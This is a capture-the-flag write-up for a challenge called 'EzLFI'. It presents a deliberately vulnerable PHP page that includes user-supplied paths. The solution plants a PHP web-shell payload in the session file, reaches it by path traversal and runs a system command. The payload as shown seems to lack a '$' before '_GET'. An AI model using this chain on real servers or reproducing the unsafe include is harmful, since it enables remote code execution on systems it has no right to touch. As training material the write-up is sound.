# EzLFI

## Description:

> LFI to RCE !

```php
<?php
highlight_file(__FILE__);
session_start();

$action = $_GET['action'];
if($action === 'register') {
    if(isset($_POST['user'])) {
        $_SESSION['user'] = $_POST['user'];
    }
} else if($action === 'module') {
    if(isset($_GET['m'])) {
        // example: m=about.php
        include("module/" . $_GET['m']);
    }
}
```

## Solution:

The `session` parameter can be controlled.

First, submit `user=<?php system(_GET[b]) ?>`, which will be added into the session file. Find `session id` in `document.cookie` with F12. The path of the session file is as follows:

```
/var/lib/php/session/session_{sessionid}
```

The session file can be included by:

```
?action=module&m=../../../../../var/lib/php/session/session_{sessionid}
```

which will execute the php code submitted previously.

Therefore, RCE can be achieved by:

```
?action=module&m=../../../../../var/lib/php/session/session_{sessionid}&b=ls
```
